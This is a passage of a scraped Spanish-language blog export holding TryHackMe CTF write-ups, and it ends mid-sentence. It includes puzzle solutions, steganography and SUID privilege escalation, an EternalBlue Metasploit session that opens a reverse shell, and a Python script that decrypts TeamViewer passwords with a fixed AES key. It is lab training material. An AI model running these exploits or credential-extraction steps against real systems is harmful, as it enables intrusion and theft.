++++++++++[\u0026gt;+\u0026gt;+++\u0026gt;+++++++\u0026gt;++++++++++\u0026lt;\u0026lt;\u0026lt;\u0026lt;-]\u0026gt;\u0026gt;\u0026gt;++++++++++++++.------------.+++++.\u0026gt;+++++++++++++++++++++++.\u0026lt;\u0026lt;++++++++++++++++++.\u0026gt;\u0026gt;-------------------.---------.++++++++++++++.++++++++++++.\u0026lt;++++++++++++++++++.+++++++++.\u0026lt;+++.+.\u0026gt;----.\u0026gt;++++.   Solucion:\nAn exclusive! Exclusive strings for everyone!\nReto:\n1 2  S1: 44585d6b2368737c65252166234f20626d S2: 1010101010101010101010101010101010   Solucion:\n1 2 3 4 5 6  script.py s1 = \u0026#34;44585d6b2368737c65252166234f20626d\u0026#34; s2 = \u0026#34;1010101010101010101010101010101010\u0026#34; a = hex(int(s1, 16) ^ int(s2, 16))[2:] print(bytes.fromhex(a).decode(\u0026#39;utf-8\u0026#39;))   Binary walk Please exfiltrate my file :)\nSolucion:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28  ➜ ctf_collection_vol1 binwalk hell.jpg DECIMAL HEXADECIMAL DESCRIPTION -------------------------------------------------------------------------------- 0 0x0 JPEG image data, JFIF standard 1.02 30 0x1E TIFF image data, big-endian, offset of first image directory: 8 265845 0x40E75 Zip archive data, at least v2.0 to extract, uncompressed size: 69, name: hello_there.txt 266099 0x40F73 End of Zip archive, footer length: 22 ➜ ctf_collection_vol1 binwalk hell.jpg -e DECIMAL HEXADECIMAL DESCRIPTION -------------------------------------------------------------------------------- 0 0x0 JPEG image data, JFIF standard 1.02 30 0x1E TIFF image data, big-endian, offset of first image directory: 8 265845 0x40E75 Zip archive data, at least v2.0 to extract, uncompressed size: 69, name: hello_there.txt 266099 0x40F73 End of Zip archive, footer length: 22 ➜ ctf_collection_vol1 ls Extinction.jpg Findme.jpg _hell.jpg.extracted help.txt spoil_hex_data ti.py Final_message.txt hell.jpg hello.hello img spoil.webp ➜ ctf_collection_vol1 ls _hell.jpg.extracted 40E75.zip hello_there.txt ➜ ctf_collection_vol1 cat _hell.jpg.extracted/hello_there.txt Thank you for extracting me, you are the best! THM{... snip ...} ➜ ctf_collection_vol1   Darkness There is something lurking in the dark.\nSolucion:\nA sounding QR How good is your listening skill?\nP/S: The flag formatted as THM{Listened Flag}, the flag should be in All CAPS\nSolucion:\nQR:\nDescargamos el archivo de audio y utilizamos Speech to Text.\nDig up the past Sometimes we need a \u0026lsquo;machine\u0026rsquo; to dig the past.\nReto:\n1 2  Targetted website: https://www.embeddedhacker.com/ Targetted time: 2 January 2020   Utilizamos web.archive.org para obtener nuestra flag en la fecha descrita.\nSolucion:\nUncrackable! Can you solve the following? By the way, I lost the key. Sorry \u0026gt;.\u0026lt;\nReto:\n1 2 3  MYKAHODTQ{RVG_YVGGK_FAL_WXF} Flag format: TRYHACKME{FLAG IN ALL CAP}   Utilizamos Vignere Decoder para obtener primero la KEY, utilizamos el formato del flag como KEY (TRYHACKME), luego de eso utilizamos el mismo formato de lo que obtuvimos.\nSolucion:\nSmall bases Decode the following text.\nReto:\n1  581695969015253365094191591547859387620042736036246486373595515576333693   Solucion:\nDecimal \u0026gt; Hex\nHex - Ascii\nRead the packet I just hacked my neighbor\u0026rsquo;s WiFi and try to capture some packet. He must be up to no good. Help me find it.\nSolucion:\nHTTP Wireshark.\n","description":"CTF collection Vol.1 es una serie de retos de Esteganografia, Reversing, Analisis de Codigo, OSINT like.","id":111,"section":"posts","tags":[],"title":"TryHackMe - CTF collection Vol.1","uri":"https://sckull.github.io/posts/ctf_collection_vol1/"},{"content":"  Madness es una maquina de TryHackMe que presenta distintos retos tras enumerar el sitio web y obtener credenciales para ingresar por SSH. Escalamos privilegios con una vulnerabilidad en screen.\nRoom    Titulo Madness      Descripción Will you be consumed by Madness?   Puntos 160   Dificultad Facil   Maker optional     NMAP Escaneo de puertos tcp/udp, nmap nos muestra el puerto http (80) y el puerto ssh (22) abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17  # Nmap 7.80 scan initiated Thu Feb 6 19:01:14 2020 as: nmap -p- -sV -sC -T4 -o nmap_scan 10.10.53.61 Nmap scan report for 10.10.53.61 Host is up (0.16s latency). Not shown: 65533 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 ac:f9:85:10:52:65:6e:17:f5:1c:34:e7:d8:64:67:b1 (RSA) | 256 dd:8e:5a:ec:b1:95:cd:dc:4d:01:b3:fe:5f:4e:12:c1 (ECDSA) |_ 256 e9:ed:e3:eb:58:77:3b:00:5e:3a:f5:24:d8:58:34:8e (ED25519) 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Apache2 Ubuntu Default Page: It works Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Thu Feb 6 19:16:00 2020 -- 1 IP address (1 host up) scanned in 886.81 seconds   HTTP Encontramos la pagina principal de Apache en el puerto http (80).\nEn el codigo fuente de la pagina encontramos una image la cual no se muestra en la pagina y al visitarla no se logra visualizar.\nDescargamos la imagen y al ver el tipo de archivo nos muestra lo siguiente:\n1 2 3 4 5 6 7 8 9 10 11 12 13  root@aoiri:~/tryhackme/madness# xxd thm.jpg |head 00000000: 8950 4e47 0d0a 1a0a 0000 0001 0100 0001 .PNG............ 00000010: 0001 0000 ffdb 0043 0003 0202 0302 0203 .......C........ 00000020: 0303 0304 0303 0405 0805 0504 0405 0a07 ................ 00000030: 0706 080c 0a0c 0c0b 0a0b 0b0d 0e12 100d ................ 00000040: 0e11 0e0b 0b10 1610 1113 1415 1515 0c0f ................ 00000050: 1718 1614 1812 1415 14ff db00 4301 0304 ............C... 00000060: 0405 0405 0905 0509 140d 0b0d 1414 1414 ................ 00000070: 1414 1414 1414 1414 1414 1414 1414 1414 ................ 00000080: 1414 1414 1414 1414 1414 1414 1414 1414 ................ 00000090: 1414 1414 1414 1414 1414 1414 1414 ffc0 ................ root@aoiri:~/tryhackme/madness# file thm.jpg thm.jpg: data   Vemos que los magic numbers pertenecen a PNG cuando el archivo esta con extencion JPG, utilizamos xxd para obtener la imagen en hexadecimal, luego de eso con vim editamos el archivo\nFF D8 FF E0 00 10 4A 46 49 46 00 01 1 2  root@aoiri:~/tryhackme/madness# xxd -p thm.jpg \u0026gt; hexthm root@aoiri:~/tryhackme/madness# vim hexthm   Remplazamos exactamente la misma cantidad de valores en hex de JPG.\nAntes:\n89504e470d0a1a0a000000010100000100010000ffdb0043000302020302 Despues:\nFFD8FFE000104A46494600010100000100010000ffdb0043000302020302 Utilizamos CyberChef para renderizar nuestra imagen:\nLa imagen nos muestra una direccion, al visitarla en la pagina encontramos lo siguiente:\nEl codigo fuente nos muestra un comentario:\nUtilizamos GOBUSTER para buscar archivos o directorios en el directorio:\n1 2  root@aoiri:~/tryhackme/madness# gobuster dir -u http://10.10.53.61/th1s_1s_h1dd3n/ -w /usr/share/wordlists/dirb/common_nofirst10.txt -q -t 15 -x php,html,txt /index.php (Status: 200)   A la pagina index le pasamos al parametro secret un numero, al hacer esto se muestra el numero:\nBURPSUITE Utilizamos burpsuite para poder obtener el numero correcto que se encuentra entre 0-99 como lo menciona el comentario que encontramos en la pagina.\nEncontramos con el numero 7+ un mensaje distinto.\nSTEGO Con la imagen que modificamos, utilizamos steghide y con la frase que nos muestra la pagina. Nos muestra el usuario e indica que ya tenemos la contraseña.\n1 2 3 4 5 6 7 8 9 10 11 12  root@aoiri:~/tryhackme/madness# steghide extract -sf imagen.jpg Enter passphrase: wrote extracted data to \u0026#34;hidden.txt\u0026#34;. root@aoiri:~/tryhackme/madness# cat hidden.txt Fine you found the password! Here\u0026#39;s a username wbxre I didn\u0026#39;t say I would make it easy for you! root@aoiri:~/tryhackme/madness#   Intentamos utilizar las credenciales en el servicio SSH pero no funcionó, por lo que utilizamos nuevamente cyberchef para poder \u0026ldquo;decodificar\u0026rdquo; el usuario.\njoker\nUtilizamos steghide para extraer los datos de la imagen de portada de la maquina (no requiere contraseña):\n1 2 3 4 5 6 7 8 9  root@aoiri:~/tryhackme/madness# steghide extract -sf 5iW7kC8.jpg Enter passphrase: wrote extracted data to \u0026#34;password.txt\u0026#34;. root@aoiri:~/tryhackme/madness# password.txt I didn\u0026#39;t think you\u0026#39;d find me! Congratulations! Here take my password *ax[... snip ...]P   SSH - USER Utilizamos las credenciales que encontramos en el servicio SSH, obtenemos nuestra shell y nuestra flat user.txt.\nPRIVILEGE ESCALATION Buscamos por archivos SUID en la maquina, encontramos screen-4.5.0, al realizar la busqueda en exploitdb encontramos un exploit que puede ayudarnos a escalar privilegios.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50  joker@ubuntu:~$ find / -perm -g=s -o -perm -u=s -type f 2\u0026gt;/dev/null /usr/lib/openssh/ssh-keysign /usr/lib/dbus-1.0/dbus-daemon-launch-helper /usr/lib/eject/dmcrypt-get-device /usr/bin/mlocate /usr/bin/chage /usr/bin/crontab /usr/bin/ssh-agent /usr/bin/wall /usr/bin/vmware-user-suid-wrapper /usr/bin/gpasswd /usr/bin/passwd /usr/bin/newgrp /usr/bin/expiry /usr/bin/chsh /usr/bin/bsd-write /usr/bin/chfn /usr/bin/sudo /usr/local/share/emacs /usr/local/share/emacs/site-lisp /usr/local/share/xml /usr/local/share/xml/schema /usr/local/share/xml/misc /usr/local/share/xml/declaration /usr/local/share/xml/entities /usr/local/share/sgml /usr/local/share/sgml/misc /usr/local/share/sgml/declaration /usr/local/share/sgml/stylesheet /usr/local/share/sgml/entities /usr/local/share/sgml/dtd /usr/local/share/fonts /usr/local/lib/python3.5 /usr/local/lib/python3.5/dist-packages /bin/fusermount /bin/su /bin/ping6 /bin/screen-4.5.0 /bin/screen-4.5.0.old /bin/mount /bin/ping /bin/umount /sbin/unix_chkpwd /sbin/pam_extrausers_chkpwd /var/cache/man /var/mail /var/local /run/log/journal /run/log/journal/2e1e8ccd62e8ef3b80d3aeab5e10fee0 joker@ubuntu:~$   screen-4.5.0\nEjecutamos el exploit en la maquina, obtenemos una shell con usuario root y nuestra flag root.txt.\n","description":"Madness es una maquina de TryHackMe que presenta distintos retos tras enumerar el sitio web y obtener credenciales para ingresar por SSH. Escalamos privilegios con una vulnerabilidad en screen.","id":112,"section":"posts","tags":["xxd","steganography","steghide","suid"],"title":"TryHackMe - Madness","uri":"https://sckull.github.io/posts/madness_thm/"},{"content":"  Pepega Energy es una maquina de TryHackMe, explotamos MS17-010 con un exploit de Metasploit para luego obtener las credenciales de TeamViewer con un modulo de postexplotacion y un script de Python.\nRoom    Titulo Pepega Energy      Descripción A new startup has asked for a security audit: turns out there\u0026rsquo;s only one laptop.   Puntos *   Dificultad Media   Maker SherlockSec     NMAP Escaneo de puertos tcp/udp, nmap nos muestra varios puertos abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46  # Nmap 7.80 scan initiated Tue Feb 11 18:02:35 2020 as: nmap -p- -sV -sC -T4 -o nmap_scan 10.10.219.23 Nmap scan report for 10.10.219.23 Host is up (0.15s latency). Not shown: 65522 closed ports PORT STATE SERVICE VERSION 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP) 3389/tcp open ssl/ms-wbt-server? |_ssl-date: 2020-02-12T00:24:28+00:00; 0s from scanner time. 5357/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Service Unavailable 5938/tcp open teamviewer? 9001/tcp open tcpwrapped 49152/tcp open msrpc Microsoft Windows RPC 49153/tcp open msrpc Microsoft Windows RPC 49154/tcp open msrpc Microsoft Windows RPC 49155/tcp open msrpc Microsoft Windows RPC 49159/tcp open msrpc Microsoft Windows RPC 49160/tcp open msrpc Microsoft Windows RPC Service Info: Host: PEPEGAENERGY-01; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_nbstat: NetBIOS name: PEPEGAENERGY-01, NetBIOS user: \u0026lt;unknown\u0026gt;, NetBIOS MAC: 02:a3:b7:7e:bc:1e (unknown) | smb-os-discovery: | OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1) | OS CPE: cpe:/o:microsoft:windows_7::sp1:professional | Computer name: PepegaEnergy-01 | NetBIOS computer name: PEPEGAENERGY-01\\x00 | Workgroup: WORKGROUP\\x00 |_ System time: 2020-02-12T00:24:21+00:00 | smb-security-mode: | account_used: \u0026lt;blank\u0026gt; | authentication_level: user | challenge_response: supported |_ message_signing: required | smb2-security-mode: | 2.02: |_ Message signing enabled and required | smb2-time: | date: 2020-02-12T00:24:21 |_ start_date: 2020-02-12T00:02:09 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Tue Feb 11 18:25:30 2020 -- 1 IP address (1 host up) scanned in 1375.40 seconds   Utilizamos nuevamente NMAP para escanear el puerto de smb (445) por posibles vulnerabilidades, vemos que es vulnerable a ms17-010.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26  # Nmap 7.80 scan initiated Tue Feb 11 18:27:13 2020 as: nmap --script smb-vuln* -p 445 -o nmap_smb_vuln 10.10.219.23 Nmap scan report for 10.10.219.23 Host is up (0.25s latency). PORT STATE SERVICE 445/tcp open microsoft-ds Host script results: |_smb-vuln-ms10-054: false |_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED | smb-vuln-ms17-010: | VULNERABLE: | Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010) | State: VULNERABLE | IDs: CVE:CVE-2017-0143 | Risk factor: HIGH | A critical remote code execution vulnerability exists in Microsoft SMBv1 | servers (ms17-010). | | Disclosure date: 2017-03-14 | References: | https://technet.microsoft.com/en-us/library/security/ms17-010.aspx | https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/ |_ https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143 # Nmap done at Tue Feb 11 18:27:26 2020 -- 1 IP address (1 host up) scanned in 12.34 seconds   METASPLOIT Utilizamos metasploit para poder explotar la vulnerabilidad, primero utilizamos el modulo auxiliar para verificar que la maquina era vulnerable.\n1 2 3 4 5 6 7 8  msf5 auxiliary(scanner/smb/smb_ms17_010) \u0026gt; set rhosts 10.10.219.23 rhosts =\u0026gt; 10.10.219.23 msf5 auxiliary(scanner/smb/smb_ms17_010) \u0026gt; run [+] 10.10.219.23:445 - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit) [*] 10.10.219.23:445 - Scanned 1 of 1 hosts (100% complete) [*] Auxiliary module execution completed msf5 auxiliary(scanner/smb/smb_ms17_010) \u0026gt;   Una vez verificado, utilizamos el exploit en contra de la maquina, obteniendo una shell con usuario nt authority\\system.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62  msf5 exploit(windows/smb/ms17_010_eternalblue) \u0026gt; show options Module options (exploit/windows/smb/ms17_010_eternalblue): Name Current Setting Required Description ---- --------------- -------- ----------- RHOSTS yes The target host(s), range CIDR identifier, or hosts file with syntax \u0026#39;file:\u0026lt;path\u0026gt;\u0026#39; RPORT 445 yes The target port (TCP) SMBDomain . no (Optional) The Windows domain to use for authentication SMBPass no (Optional) The password for the specified username SMBUser no (Optional) The username to authenticate as VERIFY_ARCH true yes Check if remote architecture matches exploit Target. VERIFY_TARGET true yes Check if remote OS matches exploit Target. Exploit target: Id Name -- ---- 0 Windows 7 and Server 2008 R2 (x64) All Service Packs msf5 exploit(windows/smb/ms17_010_eternalblue) \u0026gt; set rhosts 10.10.219.23 rhosts =\u0026gt; 10.10.219.23 msf5 exploit(windows/smb/ms17_010_eternalblue) \u0026gt; run [*] Started reverse TCP handler on 10.8.1.72:4444 [*] 10.10.219.23:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check [+] 10.10.219.23:445 - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit) [*] 10.10.219.23:445 - Scanned 1 of 1 hosts (100% complete) [*] 10.10.219.23:445 - Connecting to target for exploitation. [+] 10.10.219.23:445 - Connection established for exploitation. [+] 10.10.219.23:445 - Target OS selected valid for OS indicated by SMB reply [*] 10.10.219.23:445 - CORE raw buffer dump (42 bytes) [*] 10.10.219.23:445 - 0x00000000 57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73 Windows 7 Profes [*] 10.10.219.23:445 - 0x00000010 73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76 sional 7601 Serv [*] 10.10.219.23:445 - 0x00000020 69 63 65 20 50 61 63 6b 20 31 ice Pack 1 [+] 10.10.219.23:445 - Target arch selected valid for arch indicated by DCE/RPC reply [*] 10.10.219.23:445 - Trying exploit with 12 Groom Allocations. [*] 10.10.219.23:445 - Sending all but last fragment of exploit packet [*] 10.10.219.23:445 - Starting non-paged pool grooming [+] 10.10.219.23:445 - Sending SMBv2 buffers [+] 10.10.219.23:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer. [*] 10.10.219.23:445 - Sending final SMBv2 buffers. [*] 10.10.219.23:445 - Sending last fragment of exploit packet! [*] 10.10.219.23:445 - Receiving response from exploit packet [+] 10.10.219.23:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)! [*] 10.10.219.23:445 - Sending egg to corrupted connection. [*] 10.10.219.23:445 - Triggering free of corrupted buffer. [*] Command shell session 1 opened (10.8.1.72:4444 -\u0026gt; 10.10.219.23:49189) at 2020-02-11 18:35:42 -0600 [+] 10.10.219.23:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= [+] 10.10.219.23:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= [+] 10.10.219.23:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= Copyright (c) 2009 Microsoft Corporation. All rights reserved. C:\\Windows\\system32\u0026gt;whoami whoami nt authority\\system C:\\Windows\\system32\u0026gt;   Nuestra shell no era meterpreter por lo que utilizamos el modulo de post-explotacion shell_to_meterpreter.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44  msf5 post(multi/manage/shell_to_meterpreter) \u0026gt; show options Module options (post/multi/manage/shell_to_meterpreter): Name Current Setting Required Description ---- --------------- -------- ----------- HANDLER true yes Start an exploit/multi/handler to receive the connection LHOST no IP of host that will receive the connection from the payload (Will try to auto detect). LPORT 4433 yes Port for payload to connect to. SESSION yes The session to run this module on. msf5 post(multi/manage/shell_to_meterpreter) \u0026gt; set lhost tun0 lhost =\u0026gt; 10.8.1.72 msf5 post(multi/manage/shell_to_meterpreter) \u0026gt; set session 2 session =\u0026gt; 2 msf5 post(multi/manage/shell_to_meterpreter) \u0026gt; run [*] Upgrading session ID: 2 [*] Starting exploit/multi/handler [*] Started reverse TCP handler on 10.8.1.72:4433 [*] Post module execution completed msf5 post(multi/manage/shell_to_meterpreter) \u0026gt; sessions Active sessions =============== Id Name Type Information Connection -- ---- ---- ----------- ---------- 2 shell x64/windows Microsoft Windows [Version 6.1.7601] Copyright (c) 2009 Microsoft Corporation... 10.8.1.72:4444 -\u0026gt; 10.10.219.23:49193 (10.10.219.23) msf5 post(multi/manage/shell_to_meterpreter) \u0026gt; [*] Sending stage (180291 bytes) to 10.10.219.23 [*] Meterpreter session 3 opened (10.8.1.72:4433 -\u0026gt; 10.10.219.23:49194) at 2020-02-11 18:48:44 -0600 [*] Stopping exploit/multi/handler msf5 post(multi/manage/shell_to_meterpreter) \u0026gt; sessions Active sessions =============== Id Name Type Information Connection -- ---- ---- ----------- ---------- 2 shell x64/windows Microsoft Windows [Version 6.1.7601] Copyright (c) 2009 Microsoft Corporation... 10.8.1.72:4444 -\u0026gt; 10.10.219.23:49193 (10.10.219.23) 3 meterpreter x86/windows NT AUTHORITY\\SYSTEM @ PEPEGAENERGY-01 10.8.1.72:4433 -\u0026gt; 10.10.219.23:49194 (10.10.219.23)   TeamViewer - CVE-2019-18988 Dentro de los procesos que se estan ejecutando en la maquina hay un proceso curioso y es TeamViewer. Buscamos vulnerabilidades recientes y vemos el CVE-2019-18988 en el cual indica que pueden ser extraidos datos utilizando querys en claves de registro, en nuestro caso, utilizamos post/windows/gather/credentials/teamviewer_passwords de metasploit y logramos obtener la contraseña.\nTeamViewer - CVE-2019-18988\nPost\nPor alguna razon nuestra contraseña no se muestra completa con el modulo de metasploit, se puede hacer manualmente, haciendo un query al registro:\n1 2 3 4 5 6 7 8  C:\\Users\\Timmy\\Desktop\u0026gt;reg query HKEY_LOCAL_MACHINE\\SOFTWARE\\TeamViewer\\Version7 /v SecurityPasswordAES reg query HKEY_LOCAL_MACHINE\\SOFTWARE\\TeamViewer\\Version7 /v SecurityPasswordAES HKEY_LOCAL_MACHINE\\SOFTWARE\\TeamViewer\\Version7 SecurityPasswordAES REG_BINARY 871C158E545657D6D714B[... snip ...]594917DD1847A810EFF8C13356 C:\\Users\\Timmy\\Desktop\u0026gt;   Luego con un script en python poder desencriptar la conraseña:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20  import sys, hexdump, binascii from Crypto.Cipher import AES class AESCipher: def __init__(self, key): self.key = key def decrypt(self, iv, data): self.cipher = AES.new(self.key, AES.MODE_CBC, iv) return self.cipher.decrypt(data) key = binascii.unhexlify(\u0026#34;0602000000a400005253413100040000\u0026#34;) iv = binascii.unhexlify(\u0026#34;0100010067244F436E6762F25EA8D704\u0026#34;) hex_str_cipher = \u0026#34;871C158E545657D6D714B34730465D85E4A[... snip ...]FC41AA4A18ADFE594917DD1847A810EFF8C13356\u0026#34; #Query ciphertext = binascii.unhexlify(hex_str_cipher) raw_un = AESCipher(key).decrypt(iv, ciphertext) print(hexdump.hexdump(raw_un)) password = raw_un.decode(\u0026#39;utf-16\u0026#39;) print(password)   Contraseña:\n1 2 3 4 5 6 7  root@aoiri:~/tryhackme/pepegaenergy# python aes_teamviewer.py 00000000: 52 00 65 00 64 00 42 00 75 00 6C 00 6C 00 45 00 R.e.d.....l.l.E. 00000010: 6E 00 65 00 72 00 67 00 79 00 42 00 61 00 64 00 [... snip ...] 00000020: 58 00 44 00 00 00 00 00 00 00 00 00 00 00 00 00 X............... None Re[... snip ...]D root@aoiri:~/tryhackme/pepegaenergy#   FLAGS En la carpeta de Timmy y Zachary vemos algunos archivos con extencion rtf, los cuales podemos abrir utilizando Writer de LibreOffice y obtener la informacion que necesitamos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23  meterpreter \u0026gt; ls Listing: C:\\Users\\Timmy\\Desktop =============================== Mode Size Type Last modified Name ---- ---- ---- ------------- ---- 100666/rw-rw-rw- 1155 fil 2020-02-04 17:15:48 -0600 RuneLite.lnk 100666/rw-rw-rw- 282 fil 2020-02-04 13:56:30 -0600 desktop.ini 100666/rw-rw-rw- 42337 fil 2020-02-04 17:14:03 -0600 home work.rtf 100666/rw-rw-rw- 43806 fil 2020-02-04 17:14:03 -0600 important.rtf 100666/rw-rw-rw- 41978 fil 2020-02-04 17:14:03 -0600 rune scape pass word.rtf 100777/rwxrwxrwx 41 fil 2020-02-04 13:59:32 -0600 script.bat meterpreter \u0026gt; dir Listing: C:\\Users\\Zachary\\Desktop\\Work Documents ================================================ Mode Size Type Last modified Name ---- ---- ---- ------------- ---- 100666/rw-rw-rw- 42457 fil 2020-02-04 17:12:36 -0600 Email Backup - Mockup.rtf 100666/rw-rw-rw- 12234768 fil 2020-02-04 17:12:36 -0600 Mockup 1.png 100666/rw-rw-rw- 11780324 fil 2020-02-04 17:12:36 -0600 Mockup 2.png 100666/rw-rw-rw- 680 fil 2020-02-04 15:44:41 -0600 To-Do List.rtf   RDP - Desktop Utilizamos el servicio RDP de la maquina para obtener las flags dentro de Firefox del usuario Zachary y Timmy, para iniciar sesion en este servicio utilizamos al usuario Zachary y la contraseña que encontramos en TeamViewer:\nZachary\nTimmy\n","description":"Pepega Energy es una maquina de TryHackMe, explotamos MS17-010 con un exploit de Metasploit para luego obtener las credenciales de TeamViewer con un modulo de postexplotacion y un script de Python.","id":113,"section":"posts","tags":["metasploit","TeamViewer","rdp"],"title":"TryHackMe - Pepega Energy","uri":"https://sckull.github.io/posts/pepegaenergy/"},{"content":"  Simple CTF es una maquina de TryHackMe, en CMS Made Simple enocntramos credenciales las cuales nos dieron acceso por SSH. Con Vim e informacion de GTFOBins obtuvimos acceso privilegiado.\nRoom    Titulo Simple CTF      Descripción Beginner level ctf   Puntos 300   Dificultad Facil   Maker MrSeth6797     NMAP Escaneo de puertos tcp/udp, nmap nos muestra el puerto http (80), el puerto ssh (2222) y el puerto ftp (21) abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35  # Nmap 7.80 scan initiated Wed Feb 5 00:40:46 2020 as: nmap -p- -sV -sC -T4 -o nmap_scan 10.10.235.105 Nmap scan report for 10.10.235.105 Host is up (0.17s latency). Not shown: 65532 filtered ports PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 | ftp-anon: Anonymous FTP login allowed (FTP code 230) |_Can\u0026#39;t get directory listing: TIMEOUT | ftp-syst: | STAT: | FTP server status: | Connected to ::ffff:10.8.1.72 | Logged in as ftp | TYPE: ASCII | No session bandwidth limit | Session timeout in seconds is 300 | Control connection is plain text | Data connections will be plain text | At session startup, client count was 2 | vsFTPd 3.0.3 - secure, fast, stable |_End of status 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) | http-robots.txt: 2 disallowed entries |_/ /openemr-5_0_1_3 |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Apache2 Ubuntu Default Page: It works 2222/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 29:42:69:14:9e:ca:d9:17:98:8c:27:72:3a:cd:a9:23 (RSA) | 256 9b:d1:65:07:51:08:00:61:98:de:95:ed:3a:e3:81:1c (ECDSA) |_ 256 12:65:1b:61:cf:4d:e5:75:fe:f4:e8:d4:6e:10:2a:f6 (ED25519) Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Wed Feb 5 00:46:01 2020 -- 1 IP address (1 host up) scanned in 314.63 seconds   FTP Accedemos al servicio ftp mediante el \u0026lsquo;usuario\u0026rsquo; anonymous y encontramos una nota en la que nos muestra un mensaje que indica que la contraseña es la misma que el usuario y la contraseña puede ser crackeada en segundos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30  root@aoiri:~/tryhackme/simplectf# ftp 10.10.235.105 Connected to 10.10.235.105. 220 (vsFTPd 3.0.3) Name (10.10.235.105:root): anonymous 230 Login successful. Remote system type is UNIX. Using binary mode to transfer files. ftp\u0026gt; ls 200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. drwxr-xr-x 2 ftp ftp 4096 Aug 17 18:24 pub 226 Directory send OK. ftp\u0026gt; cd pub 250 Directory successfully changed. ftp\u0026gt; ls 200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. -rw-r--r-- 1 ftp ftp 166 Aug 17 18:24 ForMitch.txt 226 Directory send OK. ftp\u0026gt; get ForMitch.txt local: ForMitch.txt remote: ForMitch.txt 200 PORT command successful. Consider using PASV. 150 Opening BINARY mode data connection for ForMitch.txt (166 bytes). 226 Transfer complete. 166 bytes received in 0.00 secs (953.5845 kB/s) ftp\u0026gt; exit 221 Goodbye. root@aoiri:~/tryhackme/simplectf# cat ForMitch.txt Dammit man... you\u0026#39;te the worst dev i\u0026#39;ve seen. You set the same pass for the system user, and the password is so weak... i cracked it in seconds. Gosh... what a mess! root@aoiri:~/tryhackme/simplectf#   HTTP Encontramos la pagina principal de Apache en el puerto http (80).\nGOBUSTER Utilizamos gobuster para busqueda de directorios y archivos que nos pudiesen servir.\n1 2 3 4 5 6 7  root@aoiri:~/tryhackme/simplectf# gobuster dir -u 10.10.235.105 -w /usr/share/wordlists/dirb/common_nofirst10.txt -t 15 -x php,html,txt -q /index.html (Status: 200) /index.html (Status: 200) /robots.txt (Status: 200) /robots.txt (Status: 200) /server-status (Status: 403) /simple (Status: 301)   /simple Encontramos un CMS corriendo en la maquina especificamente CMS Made Simple, vemos la version que esta corriendo en el footer de la pagina.\nCMS Made Simple - CVE-2019-9053 Encontramos una vulnerabilidad de Inyeccion SQL que afecta a este CMS, utilizamos el exploit para obtener el 